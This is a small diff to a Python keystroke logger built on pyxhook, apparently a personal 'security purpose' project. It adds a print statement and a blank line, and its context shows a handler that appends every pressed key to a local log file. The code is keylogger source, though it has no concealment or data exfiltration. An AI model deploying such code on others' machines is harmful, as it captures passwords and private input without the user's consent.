@@ -4,6 +4,7 @@ import pyxhook
 
 file_log = os.environ.get( 'pylogger_file' , os.path.expanduser('~/github/SecurityPurpose/KeyStrokeRecorder/file.log'))
 
+
 cancel_key = os.environ.get('pylogger_cancel','')
 
 # getting env variable
@@ -13,7 +14,8 @@ if os.environ.get('pylogger_clean',None) is not None:
     except EnvironmentError:
         pass
 
-# on key press file to test my app
+print("hello")
+    # on key press file to test my app
 def OnKeyPress(event):
     with open(file_log,'a') as f:
         f.write(f'{event.Key}')
